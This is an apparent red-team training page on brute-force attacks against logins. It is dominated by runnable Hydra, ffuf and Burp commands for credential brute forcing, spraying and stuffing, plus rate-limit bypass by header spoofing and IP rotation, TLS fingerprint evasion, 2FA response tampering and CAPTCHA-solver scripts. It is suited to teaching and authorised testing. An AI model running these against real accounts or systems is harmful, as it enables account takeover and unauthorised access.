---
layout: training-page
title: "Brute Force & Rate Limit Bypass — Red Team Academy"
module: "Web Hacking"
tags:
  - brute-force
  - rate-limit-bypass
  - ffuf
  - burp-suite
  - ip-rotation
  - ja3-fingerprint
page_key: "web-brute-force"
render_with_liquid: false
---

# Brute Force & Rate Limit Bypass

Brute forcing in web contexts means systematically attempting combinations of credentials, tokens, or parameter values against login forms, APIs, or other input endpoints. Rate limiting, account lockout, CAPTCHA, and TLS fingerprinting are common defenses — each of which has bypass techniques.

## Tools

- **ffuf** — Fast web fuzzer written in Go — `github.com/ffuf/ffuf`
- **Burp Suite Intruder** — Multi-mode attack tool for web parameter fuzzing — `portswigger.net/burp`
- **OmniProx** — IP rotation from GCP, Azure, Alibaba, and Cloudflare — `github.com/ZephrFish/OmniProx`
- **curl-impersonate** — curl build that impersonates Chrome and Firefox TLS fingerprints — `github.com/lwthiker/curl-impersonate`
- **gpb** — Bruteforce Google user phone numbers with IPv6 rotation — `github.com/ddd/gpb`

## Burp Suite Intruder Attack Modes

Burp Suite Intruder provides four distinct attack modes for different brute force scenarios:

### Sniper

Targets a single position with one payload set. All other parameters remain static. Best for single-field fuzzing:

```
Username: password
Username1:Password1
Username1:Password2
Username1:Password3
```

### Battering Ram

Sends the same payload to all marked positions simultaneously. Useful when the same value must appear in multiple fields:

```
Username1:Username1
Username2:Username2
Username3:Username3
```

### Pitchfork

Uses different payload lists in parallel — combines the Nth entry from each list into one request. Ideal for credential stuffing with known username:password pairs:

```
Username1:Password1
Username2:Password2
Username3:Password3
```

### Cluster Bomb

Iterates through all combinations of multiple payload sets. Most thorough but generates the most requests — use for full credential brute force when account lockout is not a concern:

```
Username1:Password1
Username1:Password2
Username1:Password3
Username2:Password1
Username2:Password2
Username2:Password3
```

## FFUF Credential Brute Force

Combining username and password wordlists with IP rotation headers in a single ffuf command:

```
ffuf -w usernames.txt:USER -w passwords.txt:PASS \
     -u https://target.tld/login \
     -X POST -d "username=USER&password=PASS" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "X-Forwarded-For: FUZZ" -w ipv4-list.txt:FUZZ \
     -mc all
```

## Rate Limit Bypass Techniques

### HTTP Pipelining

HTTP/1.1 pipelining lets a client send multiple requests on a single persistent TCP connection without waiting for each response. This can saturate rate-limit counters that track per-connection request counts rather than per-IP counts, and is useful for race condition attacks against login endpoints.

### TLS Fingerprint Bypass (JA3)

JA3 fingerprints TLS clients by hashing fields from the TLS Client Hello — SSL version, cipher suites, extensions, elliptic curves, and elliptic curve formats. Web application firewalls and bot-detection systems use JA3 to identify automated tools even when HTTP headers are spoofed.

Known fingerprints to avoid:

- Burp Suite JA3: `53d67b2a806147a7d1d5df74b54dd049`, `62f6a6727fda5a1104d5b147cd82e520`
- Tor Client JA3: `e7d705a3286e19ea42f587b344ee6865`

Bypass methods:

- Use browser-driven automation (Puppeteer / Playwright) — inherits the browser's real TLS stack
- Spoof TLS handshakes with `curl-impersonate` to match Chrome or Firefox fingerprints
- Use JA3 randomization plugins for scripting libraries

```
# curl-impersonate — make requests that look like Chrome 120
curl_chrome120 https://target.com/login -d "username=admin&password=test"
```

### IPv4 Proxy Rotation

Rotate through multiple proxy servers so each request appears to originate from a different IP address, bypassing per-IP rate limits:

```
proxychains ffuf -w wordlist.txt -u https://target.tld/FUZZ
```

proxychains configuration for rotation:

```
# /etc/proxychains.conf
random_chain
chain_len = 1

[ProxyList]
socks5  127.0.0.1 1080
socks5  192.168.1.50 1080
http    proxy1.example.com 8080
http    proxy2.example.com 8080
```

### IPv6 Address Rotation

Cloud providers such as Vultr offer /64 IPv6 ranges — 18,446,744,073,709,551,616 addresses per allocation. Each request can originate from a unique IPv6 address, making per-IP rate limiting ineffective. Tools like `gpb` leverage this for large-scale attacks while remaining within a single cloud account.

---

## Tool Comparison: Hydra vs Medusa vs Burp Intruder vs ffuf

| Tool | Best For | Protocol Support | Speed | Notes |
| --- | --- | --- | --- | --- |
| Hydra | Network protocols (SSH, FTP, RDP, WinRM) | 50+ protocols | Fast | Best for non-HTTP protocols |
| Medusa | Parallel network protocol brute force | 20+ protocols | Very fast | Less maintained than Hydra |
| Burp Intruder | Web form brute force (Pro: fast, CE: throttled) | HTTP/HTTPS only | Pro: fast; CE: slow | Best for complex HTTP flows with CSRF tokens |
| ffuf | Web fuzzing including login forms | HTTP/HTTPS only | Very fast | Ideal for simple HTTP POST forms |

---

## Hydra Examples

### SSH

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt -t 4 ssh://target.com
hydra -L users.txt -P passwords.txt -t 4 -s 2222 ssh://target.com
```

### FTP

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target.com
hydra -L users.txt -P pass.txt ftp://target.com -V
```

### HTTP Basic Authentication

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-get://target.com/admin/
```

### HTTP Form-Based Login (POST)

```bash
# Format: http-post-form "path:body:failure_string"
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# With HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  -s 443 -S target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Login failed"

# With CSRF token in cookie
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:H=Cookie\: session=COOKIE_VALUE:Invalid"
```

### RDP

```bash
hydra -L users.txt -P passwords.txt rdp://target.com
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://target.com -V
```

### WinRM (Windows Remote Management)

```bash
hydra -l administrator -P passwords.txt winrm://target.com
# Port 5985 (HTTP) or 5986 (HTTPS)
hydra -l administrator -P passwords.txt -s 5985 http-post-form://target.com \
  "/wsman:...:Unauthorized"
```

---

## ffuf for Web Login Brute-Force

### Simple POST Login Form

```bash
ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
  -u https://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 302 \
  -fs 1234
```

### Username Enumeration + Password Spray

```bash
# Step 1: Enumerate valid usernames (filter by response size difference)
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \
  -u https://target.com/login \
  -X POST \
  -d "username=FUZZ&password=invalidpassword123" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fw 30

# Step 2: Spray valid usernames with common passwords
ffuf -w valid_users.txt:USER -w common_passwords.txt:PASS \
  -u https://target.com/login \
  -X POST \
  -d "username=USER&password=PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 302
```

### API Endpoint Brute-Force

```bash
# Brute force JWT or API token
ffuf -w tokens.txt \
  -u https://api.target.com/v1/users/me \
  -H "Authorization: Bearer FUZZ" \
  -fc 401
```

---

## Rate Limit Bypass Techniques

### X-Forwarded-For Rotation

Many applications rate-limit by the IP address found in `X-Forwarded-For` or similar headers, not the actual TCP source IP. Rotating this header value bypasses per-IP rate limiting:

```bash
# ffuf with rotating X-Forwarded-For
ffuf -w passwords.txt:PASS -w ips.txt:IP \
  -u https://target.com/login \
  -X POST \
  -d "username=admin&password=PASS" \
  -H "X-Forwarded-For: IP" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Other headers that may be trusted
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Remote-Addr: 1.2.3.4
X-Client-IP: 1.2.3.4
X-Host: 1.2.3.4
Forwarded: for=1.2.3.4
```

Generate a large list of fake IPs:

```bash
python3 -c "
import random
for i in range(10000):
    print(f'{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}')
" > fake-ips.txt
```

### IP Rotation (Multiple Source IPs)

Using multiple real source IP addresses (via proxy networks or cloud instances):

```bash
# OmniProx — rotate through GCP/Azure/Cloudflare IPs
# Set up OmniProx and point ffuf at the proxy
ffuf -w passwords.txt \
  -u https://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -x http://omniprox-local:8080

# Proxychains with multiple proxies (random selection)
proxychains4 -q hydra -l admin -P passwords.txt https-post-form://target.com/login/...
```

### Timing-Based Rate Limit Evasion

Slow down requests to stay under rate limit thresholds:

```bash
# ffuf with delay between requests
ffuf -w passwords.txt \
  -u https://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -p 1.0      # 1 second delay between requests

# Variable delay to avoid detection (p accepts range)
ffuf -w passwords.txt \
  -u https://target.com/login \
  -p 0.5-2.0  # Random 0.5-2.0 second delay
```

### Distributed Attack

Distribute requests across many hosts to avoid triggering any single rate limit:

```bash
# Split wordlist into chunks
split -l 1000 rockyou.txt chunk_
# Assign each chunk to a different attack host
# Coordinate callbacks to a central logging server
```

---

## 2FA / MFA Bypass Techniques

### OTP Code Prediction (Bad PRNG)

Some OTP implementations use weak pseudo-random number generators seeded with predictable values (time, user ID). If the PRNG seed can be inferred, future codes are predictable.

Signs of weak OTP PRNG:
- OTP is numeric only and sequential
- OTP regeneration triggers at predictable intervals
- OTP codes show statistical patterns

### OTP Reuse (Lack of Invalidation)

If the application does not invalidate an OTP after first use, it can be reused within its validity window:

```bash
# Test by logging in with the same OTP twice
# First login — succeeds
# Second login with same OTP within validity period — should fail, but if it succeeds, OTP reuse is confirmed
```

### Response Manipulation

Intercept the 2FA verification response in Burp Suite and modify it to simulate success:

```
# Original failed 2FA response
HTTP/1.1 403 Forbidden
{"success": false, "error": "Invalid OTP"}

# Modified response (in Burp)
HTTP/1.1 200 OK
{"success": true}
```

In Burp Proxy:
1. Intercept the 2FA verification response.
2. Change `403` to `200`, change `"success": false` to `"success": true`.
3. Forward the modified response.
4. Check if the application grants access despite invalid OTP.

### Backup Code Brute-Force

Backup codes are typically 6-10 digits and used when the primary 2FA method is unavailable. They are often generated from a small space (e.g., 8 alphanumeric characters):

```bash
# Generate backup code candidates and brute force
crunch 8 8 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ > backup-codes.txt

ffuf -w backup-codes.txt \
  -u https://target.com/2fa/backup \
  -X POST \
  -d "backup_code=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 302
```

### SMS Interception — SIM Swap / SS7

**SIM Swap:** Social engineering the mobile carrier to transfer the victim's number to an attacker-controlled SIM card. Once the transfer completes, all SMS messages including OTP codes are delivered to the attacker.

**SS7 (Signaling System No. 7) Attacks:** SS7 is the global telecom protocol. Attackers with SS7 access (telecom insiders, compromised telecom nodes) can intercept SMS messages in transit. This is not a web vulnerability but is relevant to the complete MFA bypass picture.

### 2FA Bypass via Token Leakage

Check if the 2FA token is present in the HTTP response, cookies, or page source before the user enters it:

```
# Look for OTP in the response body after initiating 2FA
# Look for it in the JSON response, hidden form fields, or cookies
grep -i "otp\|token\|code\|secret" response.html
```

---

## Account Lockout Bypass

### Username Enumeration to Avoid Locked Accounts

If an application locks accounts after N failed attempts, avoid locking target accounts by:

1. Enumerating valid usernames first without password brute-forcing.
2. Only attempting 1-2 passwords per username (password spraying).
3. Distributing attempts across all valid usernames.

**Username enumeration via response differences:**

```bash
# Different response lengths or messages for valid vs invalid usernames
ffuf -w usernames.txt \
  -u https://target.com/login \
  -X POST \
  -d "username=FUZZ&password=INVALID_PASSWORD" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -od ./responses/
# Compare responses — "No such user" vs "Invalid password" indicates valid users
```

### Credential Stuffing vs Password Spraying

**Credential stuffing**: Using known username:password pairs from data breaches. Targets many accounts with their actual known passwords. High hit rate per account tested but requires breach databases.

```bash
# Pitchfork mode — pair each username with its corresponding known password
ffuf -w breached_users.txt:USER -w breached_passwords.txt:PASS \
  -u https://target.com/login \
  -X POST \
  -d "username=USER&password=PASS" \
  -mode pitchfork
```

**Password spraying**: Testing 1-2 common passwords against many usernames. Avoids account lockout because each account receives very few attempts.

```bash
# Spray "Summer2024!" against all usernames — only 1 attempt per account
ffuf -w all_users.txt \
  -u https://target.com/login \
  -X POST \
  -d "username=FUZZ&password=Summer2024!" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -p 2.0
```

Common spray passwords:
```
Password1
Summer2024!
Winter2024!
Company2024!
Welcome1
Password@123
[Company_Name]2024
[Season][Year]!
```

---

## Wordlists

### SecLists Locations

```bash
# Clone SecLists
git clone https://github.com/danielmiessler/SecLists /opt/seclists

# Key password lists
/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
/opt/seclists/Passwords/Leaked-Databases/rockyou.txt
/opt/seclists/Passwords/Common-Credentials/best1050.txt
/opt/seclists/Passwords/Keyboard-Combinations.txt

# Username lists
/opt/seclists/Usernames/Names/names.txt
/opt/seclists/Usernames/xato-net-10-million-usernames.txt

# Default credential pairs
/opt/seclists/Passwords/Default-Credentials/default-passwords.csv
```

### rockyou.txt

```bash
# On Kali Linux
/usr/share/wordlists/rockyou.txt
# If compressed
gunzip /usr/share/wordlists/rockyou.txt.gz
```

### Custom Wordlist Generation with CeWL

CeWL spiders a target website and generates a wordlist from the words found on the pages. Useful for company-specific password patterns:

```bash
# Basic spider — depth 2, minimum word length 8
cewl https://target.com -d 2 -m 8 -w target-wordlist.txt

# Include email addresses
cewl https://target.com -d 2 -m 8 -e -w target-wordlist.txt

# With authentication
cewl https://target.com -d 2 -m 8 \
  --auth_type basic --auth_user admin --auth_pass password \
  -w target-wordlist.txt

# Generate mutations (CeWL + hashcat rules or manual)
cewl https://target.com -d 2 -m 6 | while read word; do
  echo "$word"
  echo "${word}123"
  echo "${word}2024"
  echo "${word}!"
done > mutated-wordlist.txt
```

### CUPP — Common User Passwords Profiler

CUPP generates targeted wordlists based on OSINT about a specific person:

```bash
# Install
pip install cupp
# or
git clone https://github.com/Mebus/cupp

# Interactive mode — answer questions about the target
python3 cupp.py -i

# Questions include: name, nickname, partner, children, pets, company, birthdate
# CUPP generates combinations, leet speak variants, and common appended numbers/symbols
```

---

## Anti-Bot Bypass

### CAPTCHA Solving Services

Third-party CAPTCHA solving services use human workers or ML models to solve CAPTCHAs in near-real-time:

```python
# 2captcha integration example
import requests
import time

API_KEY = "your_2captcha_api_key"
SITE_KEY = "target_site_recaptcha_key"
PAGE_URL = "https://target.com/login"

def solve_recaptcha():
    # Submit CAPTCHA solving request
    response = requests.post("http://2captcha.com/in.php", data={
        "key": API_KEY,
        "method": "userrecaptcha",
        "googlekey": SITE_KEY,
        "pageurl": PAGE_URL,
        "json": 1
    })
    task_id = response.json()["request"]

    # Poll for result
    while True:
        time.sleep(5)
        result = requests.get(
            f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={task_id}&json=1"
        ).json()
        if result["status"] == 1:
            return result["request"]  # Returns the g-recaptcha-response token

# Use the solved token in the login form
token = solve_recaptcha()
requests.post("https://target.com/login", data={
    "username": "admin",
    "password": "password",
    "g-recaptcha-response": token
})
```

Common CAPTCHA solving services:
- **2captcha** (`2captcha.com`) — human solvers, ~10 seconds response
- **anti-captcha** (`anti-captcha.com`) — human + ML solvers
- **CapSolver** (`capsolver.com`) — ML-based, faster than human services
- **death-by-captcha** (`deathbycaptcha.com`)

### Selenium-Based Approach for Complex Flows

For login forms with sophisticated bot detection (behavioral analysis, mouse movement tracking, browser fingerprinting), use a real browser controlled by Selenium or Playwright:

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Use undetected-chromedriver to bypass Cloudflare and similar bot detection
import undetected_chromedriver as uc

driver = uc.Chrome()
driver.get("https://target.com/login")

# Wait for the page to load
time.sleep(2)

# Find and fill the username field
username_field = driver.find_element(By.NAME, "username")
username_field.send_keys("admin")

# Find and fill the password field (with human-like typing delay)
password_field = driver.find_element(By.NAME, "password")
for char in "testpassword":
    password_field.send_keys(char)
    time.sleep(0.05)

# Submit
driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()

# Check result
time.sleep(2)
if "dashboard" in driver.current_url:
    print("Login successful!")
```

---

## Resources

- ffuf — `github.com/ffuf/ffuf`
- OmniProx — Multi-Cloud IP Rotation — `github.com/ZephrFish/OmniProx`
- curl-impersonate — `github.com/lwthiker/curl-impersonate`
- Burp Intruder attack types — PortSwigger documentation
- Bruteforcing the phone number of any Google user — brutecat.com
- SecLists — `github.com/danielmiessler/SecLists`
- CUPP — Common User Passwords Profiler — `github.com/Mebus/cupp`
- CeWL — Custom Word List Generator — `github.com/digininja/CeWL`
- Hydra Documentation — `github.com/vanhauser-thc/thc-hydra`
- PortSwigger Web Security Academy — Authentication — `portswigger.net/web-security/authentication`
- 2captcha API Documentation — `2captcha.com/api-docs`
- undetected-chromedriver — `github.com/ultrafunkamsterdam/undetected-chromedriver`
